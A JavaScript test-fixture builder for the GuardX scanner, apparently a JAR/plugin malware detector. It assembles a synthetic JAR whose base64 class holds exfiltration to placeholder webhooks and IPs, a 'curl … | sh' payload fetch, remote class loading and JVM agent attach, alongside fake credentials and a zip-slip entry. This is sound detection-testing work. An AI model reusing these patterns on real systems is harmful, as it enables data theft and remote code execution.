/* ============================================================
   GuardX · Demo fixture builder
   Creates a synthetic, deliberately suspicious JAR in memory so
   the scanner can be tested without any external file.
   Exposes: GX.demo
   ============================================================ */
(function (global) {
  "use strict";

  var GX = (global.GX = global.GX || {});

  /* ---------------- CRC32 ---------------- */
  var CRC_TABLE = (function () {
    var table = new Uint32Array(256);
    for (var i = 0; i < 256; i++) {
      var c = i;
      for (var k = 0; k < 8; k++) c = c & 1 ? 0xedb88320 ^ (c >>> 1) : c >>> 1;
      table[i] = c >>> 0;
    }
    return table;
  })();

  function crc32(bytes) {
    var c = 0xffffffff;
    for (var i = 0; i < bytes.length; i++) c = CRC_TABLE[(c ^ bytes[i]) & 0xff] ^ (c >>> 8);
    return (c ^ 0xffffffff) >>> 0;
  }

  /* ---------------- binary writers ---------------- */
  function u16(n) { return [n & 0xff, (n >>> 8) & 0xff]; }
  function u32(n) { return [n & 0xff, (n >>> 8) & 0xff, (n >>> 16) & 0xff, (n >>> 24) & 0xff]; }

  function concat(parts) {
    var total = 0;
    parts.forEach(function (p) { total += p.length; });
    var out = new Uint8Array(total);
    var offset = 0;
    parts.forEach(function (p) { out.set(p, offset); offset += p.length; });
    return out;
  }

  function utf8(s) { return new TextEncoder().encode(s); }

  /* ---------------- ZIP writer (stored) ---------------- */
  function buildZip(files) {
    var encoder = new TextEncoder();
    var localParts = [];
    var centralParts = [];
    var offset = 0;
    var now = new Date();
    var dosTime = ((now.getHours() << 11) | (now.getMinutes() << 5) | (now.getSeconds() >> 1)) & 0xffff;
    var dosDate = (((now.getFullYear() - 1980) << 9) | ((now.getMonth() + 1) << 5) | now.getDate()) & 0xffff;

    files.forEach(function (file) {
      var nameBytes = encoder.encode(file.name);
      var dataBytes = typeof file.data === "string" ? encoder.encode(file.data) : file.data;
      var crc = crc32(dataBytes);

      var local = concat([
        new Uint8Array(u32(0x04034b50)),
        new Uint8Array(u16(20)),        // version needed
        new Uint8Array(u16(0x0800)),    // UTF-8 flag
        new Uint8Array(u16(0)),         // method: stored
        new Uint8Array(u16(dosTime)),
        new Uint8Array(u16(dosDate)),
        new Uint8Array(u32(crc)),
        new Uint8Array(u32(dataBytes.length)),
        new Uint8Array(u32(dataBytes.length)),
        new Uint8Array(u16(nameBytes.length)),
        new Uint8Array(u16(0)),
        nameBytes,
        dataBytes
      ]);

      var central = concat([
        new Uint8Array(u32(0x02014b50)),
        new Uint8Array(u16(20)),        // version made by
        new Uint8Array(u16(20)),        // version needed
        new Uint8Array(u16(0x0800)),    // flags
        new Uint8Array(u16(0)),         // method
        new Uint8Array(u16(dosTime)),
        new Uint8Array(u16(dosDate)),
        new Uint8Array(u32(crc)),
        new Uint8Array(u32(dataBytes.length)),
        new Uint8Array(u32(dataBytes.length)),
        new Uint8Array(u16(nameBytes.length)),
        new Uint8Array(u16(0)),         // extra
        new Uint8Array(u16(0)),         // comment
        new Uint8Array(u16(0)),         // disk
        new Uint8Array(u16(0)),         // internal attrs
        new Uint8Array(u32(0)),         // external attrs
        new Uint8Array(u32(offset)),    // local header offset
        nameBytes
      ]);

      localParts.push(local);
      centralParts.push(central);
      offset += local.length;
    });

    var centralDir = concat(centralParts);
    var eocd = concat([
      new Uint8Array(u32(0x06054b50)),
      new Uint8Array(u16(0)),
      new Uint8Array(u16(0)),
      new Uint8Array(u16(files.length)),
      new Uint8Array(u16(files.length)),
      new Uint8Array(u32(centralDir.length)),
      new Uint8Array(u32(offset)),
      new Uint8Array(u16(0))
    ]);

    return concat(localParts.concat([centralDir, eocd]));
  }

  /* ---------------- synthetic .class builder ---------------- */
  /* Compiled from a controlled fixture (see README). It contains methods
     that exercise the analyzer: HTTP upload, file reads, process execution,
     reflection, URLClassLoader, crypto, native load and JVM attach. */
  var THREAT_CLASS_B64 = "yv66vgAAAEUBWAoAAgADBwAEDAAFAAYBABBqYXZhL2xhbmcvT2JqZWN0AQAGPGluaXQ+AQADKClWBwAIAQAXamF2YS9sYW5nL1N0cmluZ0J1aWxkZXIKAAcAAwgACwEACHVzZXIuZGlyCgANAA4HAA8MABAAEQEAEGphdmEvbGFuZy9TeXN0ZW0BAAtnZXRQcm9wZXJ0eQEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7CgAHABMMABQAFQEABmFwcGVuZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwoABwAXDAAUABgBABwoQylMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7CAAaAQAHb3MubmFtZQgAHAEAEXNlcnZlci5wcm9wZXJ0aWVzBwAeAQAQamF2YS9sYW5nL1N0cmluZwoAIAAhBwAiDAAjACQBABNqYXZhL25pby9maWxlL1BhdGhzAQADZ2V0AQA7KExqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbmlvL2ZpbGUvUGF0aDsHACYBABhqYXZhL25pby9maWxlL0xpbmtPcHRpb24KACgAKQcAKgwAKwAsAQATamF2YS9uaW8vZmlsZS9GaWxlcwEABmV4aXN0cwEAMihMamF2YS9uaW8vZmlsZS9QYXRoO1tMamF2YS9uaW8vZmlsZS9MaW5rT3B0aW9uOylaCgAoAC4MAC8AMAEADHJlYWRBbGxCeXRlcwEAGChMamF2YS9uaW8vZmlsZS9QYXRoOylbQgoAHQAyDAAFADMBAAUoW0IpVggANQEACUpBVkFfSE9NRQoADQA3DAA4ABEBAAZnZXRlbnYKAAcAOgwAOwA8AQAIdG9TdHJpbmcBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwoAPgA/BwBADABBADwBAA9jb20vZGVtby9UaHJlYXQBAAtjb2xsZWN0RGF0YQcAQwEADGphdmEvbmV0L1VSTAgARQEAWGh0dHBzOi8vZGlzY29yZC5jb20vYXBpL3dlYmhvb2tzLzEyMzQ1Njc4OTAxMjM0NTY3OC9BYkNkRWZHaElqS2xNbk9wUXJTdFV2V3hZejAxMjM0NTY3ODkKAEIARwwABQBIAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWCgBCAEoMAEsATAEADm9wZW5Db25uZWN0aW9uAQAaKClMamF2YS9uZXQvVVJMQ29ubmVjdGlvbjsHAE4BABpqYXZhL25ldC9IdHRwVVJMQ29ubmVjdGlvbgoATQBQDABRAFIBAAtzZXREb091dHB1dAEABChaKVYIAFQBAARQT1NUCgBNAFYMAFcASAEAEHNldFJlcXVlc3RNZXRob2QKAE0AWQwAWgBbAQAPZ2V0T3V0cHV0U3RyZWFtAQAYKClMamF2YS9pby9PdXRwdXRTdHJlYW07CgAdAF0MAF4AXwEACGdldEJ5dGVzAQAEKClbQgoAYQBiBwBjDABkADMBABRqYXZhL2lvL091dHB1dFN0cmVhbQEABXdyaXRlCgBhAGYMAGcABgEABWZsdXNoCgBNAGkMAGoAawEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsKAG0AbgcAbwwAcAAGAQATamF2YS9pby9JbnB1dFN0cmVhbQEABWNsb3NlBwByAQAYamF2YS9sYW5nL1Byb2Nlc3NCdWlsZGVyCAB0AQAHY21kLmV4ZQgAdgEAAi9jCAB4AQAccG93ZXJzaGVsbCAtZW5jIFpRQmpBR2dBYndBPQoAcQB6DAAFAHsBABYoW0xqYXZhL2xhbmcvU3RyaW5nOylWCgBxAH0MAH4AfwEABXN0YXJ0AQAVKClMamF2YS9sYW5nL1Byb2Nlc3M7CgCBAIIHAIMMAIQAhQEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwgAhwEAAnNoCACJAQACLWMIAIsBAChjdXJsIGh0dHA6Ly8yMDMuMC4xMTMuNzcvcGF5bG9hZC5zaCB8IHNoCgCBAI0MAI4AjwEABGV4ZWMBACgoW0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7CACRAQAeaHR0cDovLzIwMy4wLjExMy43Ny9wYXlsb2FkLnNoCgBCAJMMAJQAawEACm9wZW5TdHJlYW0KAG0AlgwAlwCYAQAEcmVhZAEABShbQilJBwCaAQAXamF2YS9uZXQvVVJMQ2xhc3NMb2FkZXIKAJkAnAwABQCdAQASKFtMamF2YS9uZXQvVVJMOylWCACfAQAQY29tLmRlbW8uUGF5bG9hZAoAoQCiBwCjDACkAKUBAA9qYXZhL2xhbmcvQ2xhc3MBAAdmb3JOYW1lAQA9KExqYXZhL2xhbmcvU3RyaW5nO1pMamF2YS9sYW5nL0NsYXNzTG9hZGVyOylMamF2YS9sYW5nL0NsYXNzOwgApwEAA3J1bgoAoQCpDACqAKsBABFnZXREZWNsYXJlZE1ldGhvZAEAQChMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsKAK0ArgcArwwAsABSAQAYamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kAQANc2V0QWNjZXNzaWJsZQoAoQCyDACzALQBABZnZXREZWNsYXJlZENvbnN0cnVjdG9yAQAzKFtMamF2YS9sYW5nL0NsYXNzOylMamF2YS9sYW5nL3JlZmxlY3QvQ29uc3RydWN0b3I7CgC2ALcHALgMALkAugEAHWphdmEvbGFuZy9yZWZsZWN0L0NvbnN0cnVjdG9yAQALbmV3SW5zdGFuY2UBACcoW0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsKAK0AvAwAvQC+AQAGaW52b2tlAQA5KExqYXZhL2xhbmcvT2JqZWN0O1tMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7CADAAQAUQUVTL0VDQi9QS0NTNVBhZGRpbmcKAMIAwwcAxAwAxQDGAQATamF2YXgvY3J5cHRvL0NpcGhlcgEAC2dldEluc3RhbmNlAQApKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YXgvY3J5cHRvL0NpcGhlcjsHAMgBAB9qYXZheC9jcnlwdG8vc3BlYy9TZWNyZXRLZXlTcGVjCADKAQADQUVTCgDHAMwMAAUAzQEAFyhbQkxqYXZhL2xhbmcvU3RyaW5nOylWCgDCAM8MANAA0QEABGluaXQBABcoSUxqYXZhL3NlY3VyaXR5L0tleTspVgoA0wDUBwDVDADWANcBABBqYXZhL3V0aWwvQmFzZTY0AQAKZ2V0RGVjb2RlcgEAHCgpTGphdmEvdXRpbC9CYXNlNjQkRGVjb2RlcjsIANkBAKZRVUpEUkVWR1IwaEpTa3RNVFU1UFVGRlNVMVJWVmxkWVdWcGhZbU5rWldabmFHbHFhMnh0Ym05d2NYSnpkSFYyZDNoNWVqQXhNak0wTlRZM09Ea1FVSkRSRVZHUjBoSlNrdE1UVTVQVUZGU1UxUlZWbGRZV1ZwaFltTmtaV1puYUdscWEyeHRibTl3Y1hKemRIVjJkM2g1ZWpBeE1qTTBOVFkzT0RrCgDbANwHAN0MAN4A3wEAGGphdmEvdXRpbC9CYXNlNjQkRGVjb2RlcgEABmRlY29kZQEAFihMamF2YS9sYW5nL1N0cmluZzspW0IIAOEBAANNRDUKAOMA5AcA5QwAxQDmAQAbamF2YS9zZWN1cml0eS9NZXNzYWdlRGlnZXN0AQAxKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9zZWN1cml0eS9NZXNzYWdlRGlnZXN0OwoA4wDoDADpAOoBAAZkaWdlc3QBAAYoW0IpW0IHAOwBABdqYXZhL2lvL0ZpbGVJbnB1dFN0cmVhbQgA7gEACG9wcy5qc29uCgDrAEcKAOsAbggA8gEABmhlbHBlcgoADQD0DAD1AEgBAAtsb2FkTGlicmFyeQcA9wEAE2phdmEvbGFuZy9UaHJvd2FibGUIAPkBAAQxMjM0CgD7APwHAP0MAP4A/wEAI2NvbS9zdW4vdG9vbHMvYXR0YWNoL1ZpcnR1YWxNYWNoaW5lAQAGYXR0YWNoAQA5KExqYXZhL2xhbmcvU3RyaW5nOylMY29tL3N1bi90b29scy9hdHRhY2gvVmlydHVhbE1hY2hpbmU7CAEBAQAOL3RtcC9hZ2VudC5qYXIIAQMBAAlhZ2VudG1haW4KAPsBBQwBBgEHAQAJbG9hZEFnZW50AQAnKExqYXZhL2xhbmcvU3RyaW5nO0xqYXZhL2xhbmcvU3RyaW5nOylWCgD7AQkMAQoABgEABmRldGFjaAcBDAEAD2phdmEvbmV0L1NvY2tldAgBDgEADDIwMy4wLjExMy43NwoBCwEQDAAFAREBABYoTGphdmEvbGFuZy9TdHJpbmc7SSlWCgELAFkIARQBABRBS0lBSU9TRk9ETk43RVhBTVBMRQoBCwBuCgA+AAMKAD4BGAwBGQAGAQAQdXBsb2FkU2VydmVyRGF0YQEAB1dFQkhPT0sBABJMamF2YS9sYW5nL1N0cmluZzsBAA1Db25zdGFudFZhbHVlAQALUEFZTE9BRF9VUkwBAAtFWEFNUExFX0tFWQEACEZBS0VfUEVNCAEhAQB2LS0tLS1CRUdJTiBSU0EgUFJJVkFURSBLRVktLS0tLQpNSUlFb3dJQkFBS0NBUUVBMGRlbW8wZXhhbXBsZTBub3QwYTByZWFsMGtleTBtYXRlcmlhbDA9PQotLS0tLUVORCBSU0EgUFJJVkFURSBLRVktLS0tLQEABEJMT0IBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAEUxjb20vZGVtby9UaHJlYXQ7AQACc2IBABlMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7AQADY2ZnAQAUTGphdmEvbmlvL2ZpbGUvUGF0aDsBAA1TdGFja01hcFRhYmxlBwEuAQASamF2YS9uaW8vZmlsZS9QYXRoAQAKRXhjZXB0aW9ucwcBMQEAE2phdmEvbGFuZy9FeGNlcHRpb24BAAdwYXlsb2FkAQADdXJsAQAOTGphdmEvbmV0L1VSTDsBAARjb25uAQAcTGphdmEvbmV0L0h0dHBVUkxDb25uZWN0aW9uOwEAAm9zAQAWTGphdmEvaW8vT3V0cHV0U3RyZWFtOwEACnJ1bkNvbW1hbmQBAAJwYgEAGkxqYXZhL2xhbmcvUHJvY2Vzc0J1aWxkZXI7AQAKbG9hZFJlbW90ZQEAAmluAQAVTGphdmEvaW8vSW5wdXRTdHJlYW07AQAGbG9hZGVyAQAZTGphdmEvbmV0L1VSTENsYXNzTG9hZGVyOwEAAWMBABFMamF2YS9sYW5nL0NsYXNzOwEAAW0BABpMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEABmNpcGhlcgEAFUxqYXZheC9jcnlwdG8vQ2lwaGVyOwEAFkxvY2FsVmFyaWFibGVUeXBlVGFibGUBABRMamF2YS9sYW5nL0NsYXNzPCo+OwEACm5hdGl2ZUxvYWQBAAthZ2VudEF0dGFjaAEAAnZtAQAlTGNvbS9zdW4vdG9vbHMvYXR0YWNoL1ZpcnR1YWxNYWNoaW5lOwEACXJhd1NvY2tldAEABnNvY2tldAEAEUxqYXZhL25ldC9Tb2NrZXQ7AQAEbWFp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";

  function base64ToBytes(b64) {
    var binary = global.atob(b64);
    var out = new Uint8Array(binary.length);
    for (var i = 0; i < binary.length; i++) out[i] = binary.charCodeAt(i);
    return out;
  }

  function buildClass() {
    return base64ToBytes(THREAT_CLASS_B64);
  }

  var MANIFEST = [
    "Manifest-Version: 1.0",
    "Implementation-Title: GuardX Demo Plugin",
    "Implementation-Version: 9.9.9",
    "Created-By: GuardX demo fixture",
    ""
  ].join("\r\n");

  var PLUGIN_YML = [
    "name: GuardXDemo",
    "version: 9.9.9",
    "main: com.demo.Threat",
    "api-version: '1.20'",
    "authors: [guardx]",
    "description: Plugin sintetico con senales de riesgo para probar GuardX.",
    "commands:",
    "  backdoor:",
    "    description: Demo command",
    "permissions:",
    "  '*':",
    "    description: Acceso total",
    "    default: op",
    ""
  ].join("\n");

  var SECRETS = [
    "# demo credentials (fake)",
    "aws_access_key_id = AKIAIOSFODNN7EXAMPLE",
    "aws_secret_access_key = wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
    "",
    "-----BEGIN RSA PRIVATE KEY-----",
    "MIIEowIBAAKCAQEA0demo0example0not0a0real0key0material0==",
    "-----END RSA PRIVATE KEY-----",
    "",
    "endpoint = https://transfer.sh/upload",
    ""
  ].join("\n");

  var NOTES = [
    "GuardX demo fixture",
    "===================",
    "Este archivo existe solo para demostrar el motor de reglas.",
    "Documentación legítima: https://example.com/docs",
    ""
  ].join("\n");

  var INNER_YML = [
    "name: InnerLibrary",
    "version: 1.0.0",
    "main: com.demo.Threat",
    "api-version: '1.20'",
    "authors: [guardx]",
    "description: Plugin interno de demostracion dentro de lib/inner.jar.",
    ""
  ].join("\n");

  var INNER_CONFIG = [
    "# configuracion del componente interno",
    "endpoint: https://api.telegram.org/bot123456789:ABCDEFGHIJKLMNOPQRSTUVWXYZ/sendMessage",
    "webhook: https://discord.com/api/webhooks/987654321098765432/InNeRWebhookTokenDemo",
    ""
  ].join("\n");

  function buildNestedArchives() {
    // A real JAR inside the JAR, with its own plugin metadata.
    var innerJar = buildZip([
      { name: "plugin.yml", data: INNER_YML },
      { name: "config/inner.yml", data: INNER_CONFIG },
      { name: "com/demo/Threat.class", data: buildClass() }
    ]);

    // A ZIP disguised as a .dat file: detected by its PK signature, not by name.
    var disguised = buildZip([
      { name: "payload.bin", data: buildClass() },
      { name: "README.txt", data: "Componente actualizado automaticamente.\nhttps://example.com/releases\n" }
    ]);

    return { innerJar: innerJar, disguised: disguised };
  }

  function build() {
    var dll = new Uint8Array(64);
    dll[0] = 0x4d; dll[1] = 0x5a; // "MZ"
    for (var i = 2; i < dll.length; i++) dll[i] = (i * 7) & 0xff;

    var nested = buildNestedArchives();

    var files = [
      { name: "plugin.yml", data: PLUGIN_YML },
      { name: "META-INF/MANIFEST.MF", data: MANIFEST },
      { name: "com/demo/Threat.class", data: buildClass() },
      { name: "lib/helper.dll", data: dll },
      { name: "lib/inner.jar", data: nested.innerJar },
      { name: "lib/update.dat", data: nested.disguised },
      { name: "config/secret.txt", data: SECRETS },
      { name: "assets/notes.txt", data: NOTES },
      { name: "../escape.txt", data: "zip-slip demo\n" }
    ];

    return buildZip(files);
  }

  GX.demo = {
    build: build,
    crc32: crc32
  };
})(window);
